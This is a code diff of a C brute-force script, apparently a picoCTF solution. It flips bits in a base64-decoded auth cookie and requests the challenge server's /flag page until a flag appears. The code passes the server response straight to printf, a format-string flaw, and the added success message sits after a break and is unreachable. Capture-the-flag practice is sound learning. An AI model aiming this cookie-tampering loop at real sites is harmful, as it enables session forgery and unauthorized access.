@@ -5,7 +5,6 @@
 #include "base64.h"
 
 #define URL "http://mercury.picoctf.net:<YOUR_PORT>/flag"
-#define SEARCH_STRING "picoCTF{"
 
 unsigned char *decode_cookie(char *data, size_t data_len, size_t *decoded_len)
 {
@@ -30,9 +29,10 @@ char *bit_flip(short position, int bit, unsigned char *raw_bytes, size_t raw_len
         return NULL;
     }
 
-    // Copy the contents of the original array to the copy
+    // Copy the contents of the original array to the data
     memcpy(data, raw_bytes, raw_len);
 
+    // Do bitwise XOR operation
     data[position] = data[position] ^ bit;
 
     // twice encoding
@@ -47,7 +47,7 @@ char *bit_flip(short position, int bit, unsigned char *raw_bytes, size_t raw_len
     return output;
 }
 
-int getFlag(const char *auth_cookie)
+int validate_flag(const char *auth_cookie)
 {
     // Construct the curl command
     char curl_command[1024];
@@ -72,8 +72,8 @@ int getFlag(const char *auth_cookie)
         return 1;
     }
 
-    // Check if the response contains the search string
-    if (strstr(response_buffer, SEARCH_STRING) != NULL)
+    // Check if the response contains the flag signature
+    if (strstr(response_buffer, "picoCTF{") != NULL)
     {
         printf(response_buffer);
         fflush(stdout);
@@ -89,27 +89,29 @@ int main()
 {
     char cookie[] = "<YOUR_COOKIE>";
     size_t cookie_len = strlen(cookie);
-    int total = cookie_len * 128;
 
     size_t raw_len;
     unsigned char *raw_bytes = decode_cookie(cookie, cookie_len, &raw_len);
 
-    for (int i = 0; i < 10; i++)
+    for (int i = 0; i < raw_len; i++)
     {
-        for (int j = 0; j < 10; j++)
+        for (int j = 0; j < 128; j++)
         {
             char *auth_cookie = bit_flip(i, j, raw_bytes, raw_len);
-            int result = getFlag(auth_cookie);
+            int result = validate_flag(auth_cookie);
 
             if (result == 0)
+            {
                 break;
+                printf("Got the flag with cookie:\n%s", auth_cookie);
+                fflush(stdout);
+            }
             else
             {
                 free(auth_cookie);
+                printf("Tested i(%d), j(%d)\n", i, j);
+                fflush(stdout);
             }
-
-            printf("Tested i(%d), j(%d)\n", i, j);
-            fflush(stdout);
         }
     }
 
